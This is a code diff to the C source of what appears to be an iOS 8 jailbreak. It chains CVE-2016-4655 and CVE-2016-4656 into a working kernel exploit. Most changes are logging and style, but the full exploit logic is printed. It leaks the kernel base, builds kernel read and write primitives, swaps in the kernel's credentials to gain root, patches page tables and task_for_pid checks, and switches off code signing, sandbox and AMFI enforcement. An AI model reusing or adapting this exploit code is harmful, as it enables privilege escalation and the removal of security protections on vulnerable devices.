@@ -18,6 +18,10 @@
 
 #include "patchfinder.h"
 
+#define ERROR(x, ...)       do { printf("[%s] ERROR:"x"\n", __FUNCTION__, ##__VA_ARGS__); } while(0)
+#define LOG(x, ...)         do { printf("[%s] "x"\n", __FUNCTION__, ##__VA_ARGS__); } while(0)
+
+
 #define NEWFILE  (O_WRONLY|O_SYNC)
 #define CONSOLE "/dev/console"
 
@@ -44,28 +48,29 @@
 
 #define KERNEL_BASE_ADDRESS (0x80001000)
 
-char *lockfile;
-int fd;
-int fildes[2];
-uint32_t cpipe;
-uint32_t pipebuf;
-clock_serv_t clk_battery;
-clock_serv_t clk_realtime;
-unsigned char pExploit[128];
-vm_offset_t vm_kernel_addrperm;
-uint32_t write_gadget;
+static char *lockfile;
+static int fd;
+static int fildes[2];
+static uint32_t cpipe;
+static uint32_t pipebuf;
+static clock_serv_t clk_battery;
+static clock_serv_t clk_realtime;
+static unsigned char pExploit[128];
+static vm_offset_t vm_kernel_addrperm;
+static uint32_t write_gadget;
 
-uint32_t* offsets = NULL;
+static uint32_t* offsets = NULL;
 
-uint32_t myproc=0;
-uint32_t mycred=0;
+static uid_t myuid = 0;
+static uint32_t myproc=0;
+static uint32_t mycred=0;
 
-uint32_t tte_virt;
-uint32_t tte_phys;
-uint32_t flush_dcache;
-uint32_t invalidate_tlb;
+static uint32_t tte_virt;
+static uint32_t tte_phys;
+static uint32_t flush_dcache;
+static uint32_t invalidate_tlb;
 
-const char *lock_last_path_component = "/tmp/.lock";
+static const char *lock_last_path_component = "/tmp/.lock";
 
 kern_return_t io_service_open_extended(mach_port_t service, task_t owningTask, uint32_t connect_type, NDR_record_t ndr, io_buf_ptr_t properties, mach_msg_type_number_t propertiesCnt, kern_return_t *result, mach_port_t *connection);
 kern_return_t io_registry_entry_get_properties(mach_port_t registry_entry, io_buf_ptr_t *properties, mach_msg_type_number_t *propertiesCnt);
@@ -75,65 +80,76 @@ kern_return_t clock_get_attributes(clock_serv_t clock_serv, clock_flavor_t flavo
 kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
 kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
 
-mach_port_t tfp0;
-int isIOS9=0;
-int isA6=0;
+static mach_port_t tfp0 = 0;
+static int isA6 = 0;
 
-void copyin(void* to, uint32_t from, size_t size) {
+static void copyin(void* to, uint32_t from, size_t size)
+{
     mach_vm_size_t outsize = size;
     size_t szt = size;
-    if (size > 0x1000) {
+    if (size > 0x1000)
+    {
         size = 0x1000;
     }
     size_t off = 0;
-    while (1) {
+    while (1)
+    {
         mach_vm_read_overwrite(tfp0, off+from, size, (mach_vm_offset_t)(off+to), &outsize);
         szt -= size;
         off += size;
-        if (szt == 0) {
+        if (szt == 0)
+        {
             break;
         }
         size = szt;
-        if (size > 0x1000) {
+        if (size > 0x1000)
+        {
             size = 0x1000;
         }
         
     }
 }
 
-void copyout(uint32_t to, void* from, size_t size) {
+static void copyout(uint32_t to, void* from, size_t size)
+{
     mach_vm_write(tfp0, to, (vm_offset_t)from, (mach_msg_type_number_t)size);
 }
 
-uint32_t read_primitive_byte_tfp0(uint32_t addr) {
+static uint32_t read_primitive_byte_tfp0(uint32_t addr)
+{
     uint8_t val = 0;
     copyin(&val, addr, 1);
     return val;
 }
 
-uint32_t write_primitive_byte_tfp0(uint32_t addr, uint8_t val) {
+static uint32_t write_primitive_byte_tfp0(uint32_t addr, uint8_t val)
+{
     copyout(addr, &val, 1);
     return val;
 }
 
-uint32_t read_primitive_word_tfp0(uint32_t addr) {
+static uint32_t read_primitive_word_tfp0(uint32_t addr)
+{
     uint16_t val = 0;
     copyin(&val, addr, 2);
     return val;
 }
 
-uint32_t write_primitive_word_tfp0(uint32_t addr, uint16_t val) {
+static uint32_t write_primitive_word_tfp0(uint32_t addr, uint16_t val)
+{
     copyout(addr, &val, 2);
     return val;
 }
 
-uint32_t read_primitive_dword_tfp0(uint32_t addr) {
+static uint32_t read_primitive_dword_tfp0(uint32_t addr)
+{
     uint32_t val = 0;
     copyin(&val, addr, 4);
     return val;
 }
 
-uint32_t write_primitive_dword_tfp0(uint32_t addr, uint32_t val) {
+static uint32_t write_primitive_dword_tfp0(uint32_t addr, uint32_t val)
+{
     copyout(addr, &val, 4);
     return val;
 }
@@ -154,7 +170,7 @@ enum
     kOSSerializeEndCollecton = 0x80000000U,
 };
 
-unsigned char clock_ops_overwrite[] = {
+static unsigned char clock_ops_overwrite[] = {
     0x00, 0x00, 0x00, 0x00, // [00] (rtclock.getattr): address of OSSerializer::serialize (+1)
     0x00, 0x00, 0x00, 0x00, // [04] (calend_config): NULL
     0x00, 0x00, 0x00, 0x00, // [08] (calend_init): NULL
@@ -163,7 +179,7 @@ unsigned char clock_ops_overwrite[] = {
 };
 
 
-unsigned char uaf_payload_buffer[] = {
+static unsigned char uaf_payload_buffer[] = {
     0x00, 0x00, 0x00, 0x00, // [00] ptr to clock_ops_overwrite buffer
     0x00, 0x00, 0x00, 0x00, // [04] address of clock_ops array in kern memory
     0x00, 0x00, 0x00, 0x00, // [08] address of _copyin
@@ -199,7 +215,7 @@ enum koffsets {
     offsetof_p_ucred,                // proc_t::p_ucred
 };
 
-uint32_t koffsets_S5L895xX_12H321[] = {
+static uint32_t koffsets_S5L895xX_12H321[] = {
     0x2d9864,   // OSSerializer::serialize
     0x2db984,   // OSSymbol::getMetaClass
     0x1d300,    // calend_gettime
@@ -221,7 +237,7 @@ uint32_t koffsets_S5L895xX_12H321[] = {
     0x8c,       // proc_t::p_ucred
 };
 
-uint32_t koffsets_S5L894xX_12H321[] = {
+static uint32_t koffsets_S5L894xX_12H321[] = {
     0x2D4A1C,   // OSSerializer::serialize
     0x2D6AFC,   // OSSymbol::getMetaClass
     0x1D0A0,    // calend_gettime
@@ -243,71 +259,82 @@ uint32_t koffsets_S5L894xX_12H321[] = {
     0x8c,       // proc_t::p_ucred
 };
 
-uint32_t koffset(enum koffsets offset){
-    if (offsets == NULL) {
+static uint32_t koffset(enum koffsets offset)
+{
+    if (offsets == NULL)
+    {
         return 0;
     }
     return offsets[offset];
 }
 
-void offsets_init(void){
+static void offsets_init(void)
+{
     struct utsname u = { 0 };
     uname(&u);
     
-    printf("kern.version: %s\n", u.version);
+    LOG("kern.version: %s", u.version);
     
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:44 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8950X") == 0) {
-        printf("S5L8950X: 12H321\n");
+    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:44 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8950X") == 0)
+    {
+        LOG("S5L8950X: 12H321");
         offsets = koffsets_S5L895xX_12H321;
         isA6 = 1;
     }
     
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:36 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8955X") == 0) {
-        printf("S5L8955X: 12H321\n");
+    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:36 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8955X") == 0)
+    {
+        LOG("S5L8955X: 12H321");
         offsets = koffsets_S5L895xX_12H321;
         isA6 = 1;
     }
     
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:24 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8940X") == 0) {
-        printf("S5L8940X: 12H321\n");
+    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:24 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8940X") == 0)
+    {
+        LOG("S5L8940X: 12H321\n");
         offsets = koffsets_S5L894xX_12H321;
     }
     
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:26:26 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8942X") == 0) {
-        printf("S5L8942X: 12H321\n");
+    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:26:26 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8942X") == 0)
+    {
+        LOG("S5L8942X: 12H321");
         offsets = koffsets_S5L894xX_12H321;
     }
     
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:41 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8945X") == 0) {
-        printf("S5L8945X: 12H321\n");
+    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:41 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8945X") == 0)
+    {
+        LOG("S5L8945X: 12H321");
         offsets = koffsets_S5L894xX_12H321;
     }
 }
 
-void init(void){
-    
+static void init(void)
+{
 #ifdef UNTETHER
     int fd;
     fd = open(CONSOLE,NEWFILE,0644);
-    if(fd<0){
+    if(fd<0)
+    {
         perror(CONSOLE);
     }
     close(1);
     close(2);
-    if(dup2(fd, 1) < 0){
+    if(dup2(fd, 1) < 0)
+    {
         perror("dup");
     }
-    if(dup2(fd, 2) < 0){
+    if(dup2(fd, 2) < 0)
+    {
         perror("dup");
     }
     close(fd);
     
     printf("\n");
 #endif
-    
 }
 
-void initialize(void) {
+void initialize(void)
+{
     kern_return_t kr;
     
     lockfile = malloc(strlen(lock_last_path_component) + 1);
@@ -323,21 +350,24 @@ void initialize(void) {
     assert(pipe(fildes) != -1);
     
     kr = host_get_clock_service(mach_host_self(), CALENDAR_CLOCK, &clk_battery);
-    if (kr != KERN_SUCCESS) {
-        printf("[-] err: %d\n", err_get_code(kr));
+    if (kr != KERN_SUCCESS)
+    {
+        ERROR("host_get_clock_service: %d", err_get_code(kr));
     }
     
     kr = host_get_clock_service(mach_host_self(), REALTIME_CLOCK, &clk_realtime);
-    if (kr != KERN_SUCCESS) {
-        printf("[-] err: %d\n", err_get_code(kr));
+    if (kr != KERN_SUCCESS)
+    {
+        ERROR("host_get_clock_service: %d", err_get_code(kr));
     }
 }
 
 
 // CVE-2016-4655
-uint32_t leak_kernel_base(void){
+uint32_t leak_kernel_base(void)
+{
     
-    printf("[*] running CVE-2016-4655\n");
+    LOG("running CVE-2016-4655");
     
     char data[4096];
     uint32_t bufpos = 0;
@@ -378,8 +408,9 @@ uint32_t leak_kernel_base(void){
     kern_return_t result;
     
     io_service_open_extended(service, mach_task_self(), 0, NDR_record, data, bufpos, &result, &connection);
-    if (result != KERN_SUCCESS) {
-        printf("[-] err: %d\n", err_get_code(result));
+    if (result != KERN_SUCCESS)
+    {
+        ERROR("io_service_open_extended: %d", err_get_code(result));
     }
     
     io_object_t object = 0;
@@ -388,19 +419,22 @@ uint32_t leak_kernel_base(void){
     IORegistryEntryGetChildIterator(service, "IOService", &iterator);
     
     do {
-        if (object) {
+        if (object)
+        {
             IOObjectRelease(object);
         }
         object = IOIteratorNext(iterator);
     } while (IORegistryEntryGetProperty(object, "HIDKeyboardModifierMappingSrc", data, &size));
     
-    if (size > 8) {
+    if (size > 8)
+    {
         return (*(uint32_t *)(data+36) & 0xFFF00000) + 0x1000;
     }
     return 0;
 }
 
-void *insert_payload(void *ptr) {
+void *insert_payload(void *ptr)
+{
     char stackAnchor;
     uint32_t bufpos; // unsigned int size;
     //char buffer[4096];
@@ -425,7 +459,8 @@ void *insert_payload(void *ptr) {
     
     WRITE_IN(buffer, kOSSerializeSymbol | 128);
     // "ararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararara"
-    for (v26=0; v26<124; v26+=4) {
+    for (v26=0; v26<124; v26+=4)
+    {
         WRITE_IN(buffer, 0x72617261);
     }
     WRITE_IN(buffer, 0x00617261);
@@ -451,8 +486,9 @@ void *insert_payload(void *ptr) {
     io_service_t service = IOServiceGetMatchingService(masterPort, IOServiceMatching("AppleKeyStore"));
     
     io_service_open_extended(service, mach_task_self(), 0, NDR_record, buffer, bufpos, &result, &connection);
-    if (result != KERN_SUCCESS) {
-        printf("[-] err: %d\n", err_get_code(result));
+    if (result != KERN_SUCCESS)
+    {
+        ERROR("io_service_open_extended: %d", err_get_code(result));
     }
     
     io_object_t object = 0;
@@ -464,17 +500,21 @@ void *insert_payload(void *ptr) {
     uint32_t payload_ptr = 0;
     
     do {
-        if (object) {
+        if (object)
+        {
             IOObjectRelease(object);
         }
         object = IOIteratorNext(iterator);
     } while (IORegistryEntryGetProperty(object, "ararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararara", buffer, &size));
     
-    if (size > 8) {
-        
-        if(!isA6&&!isIOS9){
+    if (size > 8)
+    {
+        if(!isA6)
+        {
             payload_ptr = *(uint32_t *)(buffer+12); // ?
-        } else {
+        }
+        else
+        {
             payload_ptr = *(uint32_t *)(buffer+16);
         }
     }
@@ -504,7 +544,8 @@ void *insert_payload(void *ptr) {
     return NULL;
 }
 
-void exec_primitive(uint32_t fct, uint32_t arg1, uint32_t arg2) {
+void exec_primitive(uint32_t fct, uint32_t arg1, uint32_t arg2)
+{
     int attr;
     unsigned int attrCnt;
     char data[64];
@@ -518,32 +559,39 @@ void exec_primitive(uint32_t fct, uint32_t arg1, uint32_t arg2) {
     read(fildes[0], data, 64);
 }
 
-uint32_t read_primitive(uint32_t addr) {
+uint32_t read_primitive(uint32_t addr)
+{
     int attr;
     unsigned int attrCnt;
     
     return clock_get_attributes(clk_battery, addr, &attr, &attrCnt);
 }
 
-void write_primitive(uint32_t addr, uint32_t value) {
+void write_primitive(uint32_t addr, uint32_t value)
+{
     addr -= 0xc;
     exec_primitive(write_gadget, addr, value);
 }
 
-void patch_page_table(int hasTFP0, uint32_t tte_virt, uint32_t tte_phys, uint32_t flush_dcache, uint32_t invalidate_tlb, uint32_t page) {
+void patch_page_table(int hasTFP0, uint32_t tte_virt, uint32_t tte_phys, uint32_t flush_dcache, uint32_t invalidate_tlb, uint32_t page)
+{
     uint32_t i = page >> 20;
     uint32_t j = (page >> 12) & 0xFF;
     uint32_t addr = tte_virt+(i<<2);
     uint32_t entry = hasTFP0 == 0 ? read_primitive_dword_tfp0(addr) : read_primitive(addr);
-    if ((entry & L1_PAGE_PROTO) == L1_PAGE_PROTO) {
+    if ((entry & L1_PAGE_PROTO) == L1_PAGE_PROTO)
+    {
         uint32_t page_entry = ((entry & L1_COARSE_PT) - tte_phys) + tte_virt;
         uint32_t addr2 = page_entry+(j<<2);
         uint32_t entry2 = hasTFP0 == 0 ? read_primitive_dword_tfp0(addr2) : read_primitive(addr2);
-        if (entry2) {
+        if (entry2)
+        {
             uint32_t new_entry2 = (entry2 & (~L2_PAGE_APX));
             hasTFP0 == 0 ? write_primitive_dword_tfp0(addr2, new_entry2) : write_primitive(addr2, new_entry2);
         }
-    } else if ((entry & L1_SECT_PROTO) == L1_SECT_PROTO) {
+    }
+    else if ((entry & L1_SECT_PROTO) == L1_SECT_PROTO)
+    {
         uint32_t new_entry = L1_PROTO_TTE(entry);
         new_entry &= ~L1_SECT_APX;
         hasTFP0 == 0 ? write_primitive_dword_tfp0(addr, new_entry) : write_primitive(addr, new_entry);
@@ -554,8 +602,9 @@ void patch_page_table(int hasTFP0, uint32_t tte_virt, uint32_t tte_phys, uint32_
     
 }
 
-void do_exploit(uint32_t kernel_base){
-    printf("[*] running CVE-2016-4656\n");
+void do_exploit(uint32_t kernel_base)
+{
+    LOG("running CVE-2016-4656");
     
     pthread_t insert_payload_thread;
     volatile uint32_t payload_ptr = 0x12345678;
@@ -572,7 +621,7 @@ void do_exploit(uint32_t kernel_base){
     assert(r == 0);
     
     while (payload_ptr == 0x12345678);
-    printf("[*] payload ptr: %p\n", (void *)payload_ptr);
+    LOG("payload ptr: %p", (void *)payload_ptr);
     
     // CVE-2016-4656
     memcpy(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
@@ -611,7 +660,7 @@ void do_exploit(uint32_t kernel_base){
     
     /* trigger the bug */
     kr = io_service_get_matching_services_bin(master, data, bufpos, &res);
-    printf("[*] kr: %x\n", kr);
+    LOG("io_service_get_matching_services_bin: %x", kr);
     
     /* test read primitive */
     assert(read_primitive(kernel_base) == 0xfeedface);
@@ -642,13 +691,14 @@ void do_exploit(uint32_t kernel_base){
     tte_phys = read_primitive(kernel_pmap_store+4);
     flush_dcache = koffset(offsetof_flush_dcache) + kernel_base;
     invalidate_tlb = koffset(offsetof_invalidate_tlb) + kernel_base;
-    printf("[OF] kernel pmap: %08x\n", kernel_pmap);
-    printf("[*] kernel pmap store: %08x\n", kernel_pmap_store);
-    printf("[*] tte_virt: %08x\n", tte_virt);
-    printf("[*] tte_phys: %08x\n", tte_phys);
+    LOG("pmap: %08x", kernel_pmap);
+    LOG("pmap store: %08x", kernel_pmap_store);
+    LOG("virt: %08x", tte_virt);
+    LOG("phys: %08x", tte_phys);
     
-    pid_t uid = getuid();
-    if(uid != 0){
+    myuid = getuid();
+    if(myuid != 0)
+    {
         // elevation to root privilege by xerub
         uint32_t kproc = 0;
         myproc = 0;
@@ -656,11 +706,15 @@ void do_exploit(uint32_t kernel_base){
         pid_t mypid = getpid();
         pid_t myuid = getuid();
         uint32_t proc = read_primitive(kernel_base + koffset(offsetof_allproc));
-        while (proc) {
+        while (proc)
+        {
             uint32_t pid = read_primitive(proc + koffset(offsetof_p_pid));
-            if (pid == mypid) {
+            if (pid == mypid)
+            {
                 myproc = proc;
-            } else if (pid == 0) {
+            }
+            else if (pid == 0)
+            {
                 kproc = proc;
             }
             proc = read_primitive(proc);
@@ -669,14 +723,14 @@ void do_exploit(uint32_t kernel_base){
         uint32_t kcred = read_primitive(kproc + koffset(offsetof_p_ucred));
         write_primitive(myproc + koffset(offsetof_p_ucred), kcred);
         setuid(0);
-        printf("[*] I am god?: %x\n", getuid());
+        LOG("I am god?: %x", getuid());
     }
     
     
     /* task_for_pid */
     uint32_t task_for_pid_base = koffset(offsetof_task_for_pid) + kernel_base;
     uint32_t pid_check_addr = koffset(offsetof_pid_check) + task_for_pid_base;
-    printf("[OF] pid_check_addr: %08x\n", pid_check_addr);
+    LOG("pid_check_addr: %08x", pid_check_addr);
     
     patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, pid_check_addr & ~0xFFF);
     
@@ -688,7 +742,8 @@ void do_exploit(uint32_t kernel_base){
     uint32_t posix_check_ret_val;
     uint32_t mac_proc_check_ret_addr;
     uint32_t mac_proc_check_ret_val;
-    if(uid != 0){
+    if(myuid != 0)
+    {
         posix_check_ret_addr = koffset(offsetof_posix_check) + task_for_pid_base;
         posix_check_ret_val = read_primitive(posix_check_ret_addr);
         patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, posix_check_ret_addr & ~0xFFF);
@@ -707,7 +762,8 @@ void do_exploit(uint32_t kernel_base){
     task_for_pid(mach_task_self(), 0, &kernel_task);
     tfp0 = kernel_task;
     
-    if(uid != 0){
+    if(myuid != 0)
+    {
         write_primitive_dword_tfp0(posix_check_ret_addr, posix_check_ret_val);
         write_primitive_dword_tfp0(mac_proc_check_ret_addr, mac_proc_check_ret_val);
         exec_primitive(flush_dcache, 0, 0);
@@ -716,8 +772,10 @@ void do_exploit(uint32_t kernel_base){
     
 }
 
-void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize) {
-    for (vm_address_t addr = kernel_base, e = 0; addr < kernel_base + ksize; addr += CHUNK_SIZE, e += CHUNK_SIZE) {
+void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize)
+{
+    for (vm_address_t addr = kernel_base, e = 0; addr < kernel_base + ksize; addr += CHUNK_SIZE, e += CHUNK_SIZE)
+    {
         pointer_t buf = 0;
         vm_address_t sz = 0;
         vm_read(tfp0, addr, CHUNK_SIZE, &buf, &sz);
@@ -727,8 +785,9 @@ void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize) {
     }
 }
 
-void patch_bootargs(uint32_t addr){
-    //printf("set bootargs\n");
+void patch_bootargs(uint32_t addr)
+{
+    LOG("setting bootargs");
     uint32_t bootargs_addr = read_primitive_dword_tfp0(addr) + 0x38;
     const char* new_bootargs = "cs_enforcement_disable=1 amfi_get_out_of_my_way=1";
     
@@ -767,14 +826,17 @@ make_b_w(int pos, int tgt)
     if(tgt > pos) i = tgt - pos - 4;
     if(tgt < pos) i = pos - tgt - 4;
     
-    if (i < range){
+    if (i < range)
+    {
         pfx = 0xF000 | ((delta >> 12) & 0x7FF);
         sfx =  omask_1k | ((delta >>  1) & amask);
         
         return (unsigned int)pfx | ((unsigned int)sfx << 16);
     }
     
-    if (range < i && i < range*2){ // range: 0x400000-0x800000
+    // range: 0x400000-0x800000
+    if (range < i && i < range*2)
+    {
         delta -= range;
         pfx = 0xF000 | ((delta >> 12) & 0x7FF);
         sfx =  omask_2k | ((delta >>  1) & amask);
@@ -782,7 +844,9 @@ make_b_w(int pos, int tgt)
         return (unsigned int)pfx | ((unsigned int)sfx << 16);
     }
     
-    if (range*2 < i && i < range*3){ // range: 0x800000-0xc000000
+    // range: 0x800000-0xc000000
+    if (range*2 < i && i < range*3)
+    {
         delta -= range*2;
         pfx = 0xF000 | ((delta >> 12) & 0x7FF);
         sfx =  omask_3k | ((delta >>  1) & amask);
@@ -790,7 +854,9 @@ make_b_w(int pos, int tgt)
         return (unsigned int)pfx | ((unsigned int)sfx << 16);
     }
     
-    if (range*3 < i && i < range*4){ // range: 0xc00000-0x10000000
+    // range: 0xc00000-0x10000000
+    if (range*3 < i && i < range*4)
+    {
         delta -= range*3;
         pfx = 0xF000 | ((delta >> 12) & 0x7FF);
         sfx =  omask_4k | ((delta >>  1) & amask);
@@ -817,16 +883,17 @@ make_bl(int pos, int tgt)
     return (unsigned int)pfx | ((unsigned int)sfx << 16);
 }
 
-void unjail8(uint32_t kbase){
-    printf("[*] jailbreaking...\n");
+void unjail8(uint32_t kbase)
+{
+    LOG("jailbreaking...");
     
-    printf("[*] running kdumper\n");
+    LOG("running kdumper");
     size_t ksize = 0xFFE000;
     void *kdata = malloc(ksize);
     dump_kernel(kbase, kdata, ksize);
     
     /* patchfinder */
-    printf("[*] running patchfinder\n");
+    LOG("running patchfinder");
     uint32_t proc_enforce = kbase + find_proc_enforce(kbase, kdata, ksize);
     uint32_t cs_enforcement_disable_amfi = kbase + find_cs_enforcement_disable_amfi(kbase, kdata, ksize);
     uint32_t PE_i_can_has_debugger_1 = kbase + find_i_can_has_debugger_1(kbase, kdata, ksize);
@@ -844,24 +911,24 @@ void unjail8(uint32_t kbase){
     uint32_t csops_addr = kbase + find_csops(kbase, kdata, ksize);
     uint32_t csops2_addr = kbase + find_csops2(kbase, kdata, ksize);
     
-    printf("[PF] proc_enforce:               %08x\n", proc_enforce);
-    printf("[PF] cs_enforcement_disable:     %08x\n", cs_enforcement_disable_amfi);
-    printf("[PF] PE_i_can_has_debugger_1:    %08x\n", PE_i_can_has_debugger_1);
-    printf("[PF] PE_i_can_has_debugger_2:    %08x\n", PE_i_can_has_debugger_2);
-    printf("[PF] p_bootargs:                 %08x\n", p_bootargs);
-    printf("[PF] vm_fault_enter:             %08x\n", vm_fault_enter);
-    printf("[PF] vm_map_enter:               %08x\n", vm_map_enter);
-    printf("[PF] vm_map_protect:             %08x\n", vm_map_protect);
-    printf("[PF] mount_patch:                %08x\n", mount_patch);
-    printf("[PF] mapForIO:                   %08x\n", mapForIO);
-    printf("[PF] sb_call_i_can_has_debugger: %08x\n", sandbox_call_i_can_has_debugger);
-    printf("[PF] sb_evaluate:                %08x\n", sb_patch);
-    printf("[PF] memcmp:                     %08x\n", memcmp_addr);
-    printf("[PF] vn_getpath:                 %08x\n", vn_getpath);
-    printf("[PF] csops:                      %08x\n", csops_addr);
-    printf("[PF] csops2:                     %08x\n", csops2_addr);
+    LOG("PF: proc_enforce:               %08x", proc_enforce);
+    LOG("PF: cs_enforcement_disable:     %08x", cs_enforcement_disable_amfi);
+    LOG("PF: PE_i_can_has_debugger_1:    %08x", PE_i_can_has_debugger_1);
+    LOG("PF: PE_i_can_has_debugger_2:    %08x", PE_i_can_has_debugger_2);
+    LOG("PF: p_bootargs:                 %08x", p_bootargs);
+    LOG("PF: vm_fault_enter:             %08x", vm_fault_enter);
+    LOG("PF: vm_map_enter:               %08x", vm_map_enter);
+    LOG("PF: vm_map_protect:             %08x", vm_map_protect);
+    LOG("PF: mount_patch:                %08x", mount_patch);
+    LOG("PF: mapForIO:                   %08x", mapForIO);
+    LOG("PF: sb_call_i_can_has_debugger: %08x", sandbox_call_i_can_has_debugger);
+    LOG("PF: sb_evaluate:                %08x", sb_patch);
+    LOG("PF: memcmp:                     %08x", memcmp_addr);
+    LOG("PF: vn_getpath:                 %08x", vn_getpath);
+    LOG("PF: csops:                      %08x", csops_addr);
+    LOG("PF: csops2:                     %08x", csops2_addr);
     
-    printf("[*] running kernelpatcher\n");
+    LOG("running kernelpatcher");
     
     /* proc_enforce: -> 0 */
     write_primitive_dword_tfp0(proc_enforce, 0);
@@ -967,23 +1034,24 @@ void unjail8(uint32_t kbase){
     
     exec_primitive(flush_dcache, 0, 0);
     
-    printf("enable patched.\n");
+    LOG("enable patched");
     
 }
 
-void load_jb(void){
-    
+void load_jb(void)
+{
     // remount rootfs
-    printf("[*] remounting rootfs\n");
+    LOG("remounting rootfs");
     char* nmr = strdup("/dev/disk0s1s1");
     int mntr = mount("hfs", "/", MNT_UPDATE, &nmr);
-    printf("remount = %d\n",mntr);
+    LOG("remount = %d",mntr);
     
     const char *jl;
     pid_t pd = 0;
     
     int f = open("/.installed_daibutsu", O_RDONLY);
-    if (f == -1) {
+    if (f == -1)
+    {
         chmod("/private", 0777);
         chmod("/private/var", 0777);
         chmod("/private/var/mobile", 0777);
@@ -991,7 +1059,7 @@ void load_jb(void){
         chmod("/private/var/mobile/Library/Preferences", 0777);
         
         posix_spawn(&pd, "/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", 0, 0, (char**)&(const char*[]){"/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", "install", NULL}, NULL);
-        printf("[*] pid = %x\n", pd);
+        LOG("pid = %x", pd);
         waitpid(pd, 0, 0);
         sleep(3);
         
@@ -1000,7 +1068,7 @@ void load_jb(void){
         chown("/.installed_daibutsu", 0, 0);
     }
     
-    printf("[*] loading JB\n");
+    LOG("loading JB services");
     // substrate: run "dirhelper"
     jl = "/bin/bash";
     posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "/usr/libexec/dirhelper", NULL }, NULL);
@@ -1011,7 +1079,6 @@ void load_jb(void){
     jl = "/bin/launchctl";
     posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/Library/LaunchDaemons", NULL }, NULL);
     
-#ifdef UNTETHER
     posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/Library/NanoLaunchDaemons", NULL }, NULL);
     
     usleep(10000);
@@ -1019,49 +1086,48 @@ void load_jb(void){
     jl = "/usr/libexec/CrashHousekeeping_o";
     posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, NULL }, NULL);
     
-#endif
-    
-#ifdef RELOADER
-    jl = "/usr/bin/killall";
-    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "-9", "backboardd", NULL }, NULL);
-#endif
-    
 }
 
-void failed(void){
-    
-    printf("[-] failed to execute untether. rebooting.\n");
+void failed(void)
+{
+    LOG("failed to execute untether. rebooting.");
     reboot(0);
 }
 
-int main(void){
-    
+int main(void)
+{
+
     init();
     
     offsets_init();
     initialize();
     
     uint32_t kernel_base = leak_kernel_base();
-    printf("[*] kernel_base: %x\n", kernel_base);
+    LOG("kernel_base: %x", kernel_base);
     
     do_exploit(kernel_base);
     
-    if(tfp0){
-        printf("[*] got tfp0: %x\n", tfp0);
+    if(tfp0)
+    {
+        LOG("got tfp0: %x", tfp0);
         
         unjail8(kernel_base);
-        
+#ifdef UNTETHER
         load_jb();
+#endif
         
-    } else {
-        printf("[-] Failed to get tfp0\n");
+    }
+    else
+    {
+        ERROR("Failed to get tfp0");
         failed();
         return -1;
     }
     
     printf("[*] DONE!\n");
 
-    if(myproc){
+    if(myuid != 0 && myproc)
+    {
         write_primitive(myproc + koffset(offsetof_p_ucred), mycred);
         setuid(501);
     }
